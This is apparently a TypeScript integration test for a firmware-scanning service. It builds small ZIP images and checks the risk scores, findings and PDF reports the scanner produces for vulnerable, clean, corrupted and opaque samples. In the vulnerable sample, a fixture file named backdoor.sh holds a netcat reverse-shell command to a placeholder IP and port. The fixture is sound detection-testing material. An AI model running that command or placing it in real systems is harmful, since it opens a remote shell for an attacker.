import assert from "node:assert";
import { randomUUID } from "node:crypto";
import { db, scansTable, vulnerabilityFindingsTable } from "../lib/db/src/index";
import { eq } from "drizzle-orm";
import { runFirmwareAnalysis } from "../artifacts/api-server/src/lib/firmware-analysis";
import { generatePdfReportBuffer } from "../artifacts/api-server/src/lib/reports/pdf-report";

function createZipBuffer(files: Array<{ name: string; content: string }>): Buffer {
  const fileEntries: Buffer[] = [];
  const cdEntries: Buffer[] = [];
  let offset = 0;

  for (const f of files) {
    const data = Buffer.from(f.content, "utf8");
    const nameBuf = Buffer.from(f.name, "utf8");

    // Local file header (30 bytes + name)
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); // signature
    lh.writeUInt16LE(20, 4); // version needed
    lh.writeUInt16LE(0, 6); // flags
    lh.writeUInt16LE(0, 8); // compression (0 = store)
    lh.writeUInt16LE(0, 10); // time
    lh.writeUInt16LE(0, 12); // date
    lh.writeUInt32LE(0, 14); // crc32
    lh.writeUInt32LE(data.length, 18); // compressed size
    lh.writeUInt32LE(data.length, 22); // uncompressed size
    lh.writeUInt16LE(nameBuf.length, 26); // name length
    lh.writeUInt16LE(0, 28); // extra length

    fileEntries.push(Buffer.concat([lh, nameBuf, data]));

    // Central directory header (46 bytes + name)
    const cd = Buffer.alloc(46);
    cd.writeUInt32LE(0x02014b50, 0);
    cd.writeUInt16LE(20, 4);
    cd.writeUInt16LE(20, 6);
    cd.writeUInt16LE(0, 8);
    cd.writeUInt16LE(0, 10);
    cd.writeUInt16LE(0, 12);
    cd.writeUInt16LE(0, 14);
    cd.writeUInt32LE(0, 16);
    cd.writeUInt32LE(data.length, 20);
    cd.writeUInt32LE(data.length, 24);
    cd.writeUInt16LE(nameBuf.length, 28);
    cd.writeUInt16LE(0, 30);
    cd.writeUInt16LE(0, 32);
    cd.writeUInt16LE(0, 34);
    cd.writeUInt16LE(0, 36);
    cd.writeUInt32LE(0, 38);
    cd.writeUInt32LE(offset, 42); // relative offset of local header

    cdEntries.push(Buffer.concat([cd, nameBuf]));
    offset += lh.length + nameBuf.length + data.length;
  }

  const cdStart = offset;
  const cdSize = cdEntries.reduce((acc, b) => acc + b.length, 0);

  // End of central directory record (22 bytes)
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cdSize, 12);
  eocd.writeUInt32LE(cdStart, 16);
  eocd.writeUInt16LE(0, 20);

  return Buffer.concat([...fileEntries, ...cdEntries, eocd]);
}

async function runMatrix() {
  console.log("===============================================================");
  console.log("  FOUR-SAMPLE END-TO-END FIRMWARE ANALYSIS INTEGRATION MATRIX  ");
  console.log("===============================================================\n");

  // =========================================================================
  // SCENARIO 1: KNOWN-VULNERABLE FIRMWARE
  // =========================================================================
  console.log("▶ SCENARIO 1: Known-Vulnerable Firmware Sample...");
  const vulnScanId = `matrix-vuln-${randomUUID()}`;
  const vulnPwd = Buffer.from(
    createZipBuffer([
      { name: "etc/shadow", content: "root:$1$admin:18000:0:99999:7:::\n" },
      { name: "bin/busybox", content: "BusyBox v1.34.0 multi-call binary\nReport bugs to busybox list.\n" },
      { name: "bin/backdoor.sh", content: "#!/bin/sh\n/bin/busybox nc -e /bin/sh 192.168.1.50 4444 &\n" },
    ]),
  );

  await db.insert(scansTable).values({
    id: vulnScanId,
    firmwareName: "vulnerable_router.zip",
    firmwareType: "Pending identification",
    sizeBytes: vulnPwd.length,
    status: "Uploaded",
    vulnerabilityCount: 0,
    malwareIndicatorCount: 0,
    progress: 0,
    progressMessage: "Starting",
  });

  await runFirmwareAnalysis(vulnScanId, "vulnerable_router.zip", vulnPwd);
  const [vulnScan] = await db.select().from(scansTable).where(eq(scansTable.id, vulnScanId));
  const vulnFindings = await db.select().from(vulnerabilityFindingsTable).where(eq(vulnerabilityFindingsTable.scanId, vulnScanId));

  console.log(`  ✓ Status            : ${vulnScan?.status}`);
  console.log(`  ✓ Risk Score        : ${vulnScan?.riskScore}/100 (${vulnScan?.riskLevel})`);
  console.log(`  ✓ Total Findings    : ${vulnFindings.length}`);
  console.log(`  ✓ Malware Indicators: ${vulnScan?.malwareIndicatorCount}`);

  assert.strictEqual(vulnScan?.status, "Analysis Completed");
  assert(vulnScan?.riskScore != null && vulnScan.riskScore >= 80, "Expected High or Critical risk score");
  assert(vulnFindings.length >= 5, "Expected multiple vulnerability findings");
  assert(vulnScan.malwareIndicatorCount > 0, "Expected malware indicators");

  // Verify PDF report generation for Scenario 1
  const vulnPdf = await generatePdfReportBuffer({
    scanId: vulnScan.id,
    firmwareName: vulnScan.firmwareName,
    firmwareType: vulnScan.firmwareType,
    sizeBytes: vulnScan.sizeBytes,
    status: vulnScan.status,
    riskScore: vulnScan.riskScore,
    riskLevel: vulnScan.riskLevel,
    sha256: vulnScan.sha256,
    findings: vulnFindings.map((f) => ({
      id: f.id,
      category: f.category,
      title: f.title,
      severity: f.severity,
      affectedPath: f.affectedPath,
      cve: f.cve,
      component: f.component,
      detectionSource: f.detectionSource,
      description: f.description,
      recommendation: f.recommendation,
    })),
  });
  assert(Buffer.isBuffer(vulnPdf) && vulnPdf.length > 1000, "PDF generation for vulnerable sample must succeed");
  console.log(`  ✓ PDF Report Size   : ${vulnPdf.length} bytes (%PDF confirmed)\n`);

  // =========================================================================
  // SCENARIO 2: CLEAN FIRMWARE
  // =========================================================================
  console.log("▶ SCENARIO 2: Clean Firmware Sample...");
  const cleanScanId = `matrix-clean-${randomUUID()}`;
  const cleanPwd = Buffer.from(
    createZipBuffer([
      { name: "etc/issue", content: "Welcome to Embedded Linux\n" },
      { name: "etc/banner", content: "Secure Gateway OS v2.0\n" },
      { name: "usr/bin/hello", content: "#!/bin/sh\necho 'Service started successfully'\n" },
    ]),
  );

  await db.insert(scansTable).values({
    id: cleanScanId,
    firmwareName: "clean_device.zip",
    firmwareType: "Pending identification",
    sizeBytes: cleanPwd.length,
    status: "Uploaded",
    vulnerabilityCount: 0,
    malwareIndicatorCount: 0,
    progress: 0,
    progressMessage: "Starting",
  });

  await runFirmwareAnalysis(cleanScanId, "clean_device.zip", cleanPwd);
  const [cleanScan] = await db.select().from(scansTable).where(eq(scansTable.id, cleanScanId));
  const cleanFindings = await db.select().from(vulnerabilityFindingsTable).where(eq(vulnerabilityFindingsTable.scanId, cleanScanId));

  console.log(`  ✓ Status            : ${cleanScan?.status}`);
  console.log(`  ✓ Risk Score        : ${cleanScan?.riskScore}/100 (${cleanScan?.riskLevel})`);
  console.log(`  ✓ Total Findings    : ${cleanFindings.length}`);
  console.log(`  ✓ Malware Indicators: ${cleanScan?.malwareIndicatorCount}`);

  assert.strictEqual(cleanScan?.status, "Analysis Completed");
  assert.strictEqual(cleanScan?.riskScore, 0, "Clean sample must score 0 risk");
  assert.strictEqual(cleanScan?.malwareIndicatorCount, 0, "Clean sample must have 0 malware indicators");

  const cleanPdf = await generatePdfReportBuffer({
    scanId: cleanScan.id,
    firmwareName: cleanScan.firmwareName,
    firmwareType: cleanScan.firmwareType,
    sizeBytes: cleanScan.sizeBytes,
    status: cleanScan.status,
    riskScore: cleanScan.riskScore,
    riskLevel: cleanScan.riskLevel,
    sha256: cleanScan.sha256,
    findings: [],
  });
  assert(Buffer.isBuffer(cleanPdf) && cleanPdf.length > 500, "Clean PDF must succeed");
  console.log(`  ✓ PDF Report Size   : ${cleanPdf.length} bytes\n`);

  // =========================================================================
  // SCENARIO 3: CORRUPTED FIRMWARE
  // =========================================================================
  console.log("▶ SCENARIO 3: Corrupted Firmware Sample...");
  const corruptScanId = `matrix-corrupt-${randomUUID()}`;
  const corruptBuffer = Buffer.from("PK\x03\x04\x00\x00\x00\x00garbage_truncated_archive_bytes");

  await db.insert(scansTable).values({
    id: corruptScanId,
    firmwareName: "damaged_image.zip",
    firmwareType: "Pending identification",
    sizeBytes: corruptBuffer.length,
    status: "Uploaded",
    vulnerabilityCount: 0,
    malwareIndicatorCount: 0,
    progress: 0,
    progressMessage: "Starting",
  });

  await runFirmwareAnalysis(corruptScanId, "damaged_image.zip", corruptBuffer);
  const [corruptScan] = await db.select().from(scansTable).where(eq(scansTable.id, corruptScanId));

  console.log(`  ✓ Status            : ${corruptScan?.status}`);
  console.log(`  ✓ Progress Message  : ${corruptScan?.progressMessage}\n`);
  assert(
    corruptScan?.status === "Corrupted" || corruptScan?.status === "Extraction Failed" || corruptScan?.status === "Analysis Failed",
    `Expected failure status, got ${corruptScan?.status}`,
  );

  // =========================================================================
  // SCENARIO 4: UNEXTRACTABLE / PARTIALLY RECOVERABLE FIRMWARE
  // =========================================================================
  console.log("▶ SCENARIO 4: Unextractable / Unsupported Firmware Sample...");
  const unextractScanId = `matrix-unextract-${randomUUID()}`;
  const randomBinaryBuffer = Buffer.alloc(4096, 0xaa); // Non-container opaque binary

  await db.insert(scansTable).values({
    id: unextractScanId,
    firmwareName: "opaque_firmware.bin",
    firmwareType: "Pending identification",
    sizeBytes: randomBinaryBuffer.length,
    status: "Uploaded",
    vulnerabilityCount: 0,
    malwareIndicatorCount: 0,
    progress: 0,
    progressMessage: "Starting",
  });

  await runFirmwareAnalysis(unextractScanId, "opaque_firmware.bin", randomBinaryBuffer);
  const [unextractScan] = await db.select().from(scansTable).where(eq(scansTable.id, unextractScanId));

  console.log(`  ✓ Status            : ${unextractScan?.status}`);
  console.log(`  ✓ Risk Score        : ${unextractScan?.riskScore ?? "null (unassessed)"}`);
  console.log(`  ✓ Extraction Status : ${unextractScan?.extractionStatus}`);
  console.log(`  ✓ Progress Message  : ${unextractScan?.progressMessage}\n`);

  assert(
    unextractScan?.status === "Unsupported" ||
    (unextractScan?.status === "Analysis Completed" && unextractScan?.riskScore === null),
    "Unextractable image must either be Unsupported or complete with null (unassessed) risk score",
  );

  console.log("===============================================================");
  console.log("  ALL FOUR INTEGRATION MATRIX SCENARIOS PASSED WITH FULL PARITY! ");
  console.log("===============================================================");
}

runMatrix().catch((err) => {
  console.error("✖ Matrix integration test failed:", err);
  process.exit(1);
});
